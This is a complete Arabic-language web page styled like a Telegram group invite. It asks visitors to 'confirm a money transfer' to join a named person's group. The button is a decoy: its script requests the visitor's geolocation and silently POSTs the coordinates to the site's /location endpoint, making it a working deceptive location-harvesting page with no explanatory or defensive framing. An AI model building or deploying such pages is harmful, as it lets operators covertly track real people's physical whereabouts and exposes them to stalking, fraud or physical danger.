<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>وائل الغالي</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: sans-serif; background-color: #0088cc; color: #fff; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; }
    .card { background: #fff; color: #000; padding: 30px; border-radius: 10px; text-align: center; width: 300px; }
    .btn { background: #0088cc; color: #fff; padding: 12px 20px; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; width: 100%; }
    .btn:hover { background: #0075aa; }
  </style>
</head>
<body>
  <div class="card">
    <h2>مجموعة وائل الغالي</h2>
    <p>للمشاركة في المجموعة، يرجى تأكيد تحويل المال</p>
    <button class="btn" onclick="requestLocation()">تأكيد تحويل المال</button>
  </div>
  <script>
    function requestLocation() {
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(function(pos) {
          fetch('/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude
            })
          });
        });
      }
    }
  </script>
</body>
</html>
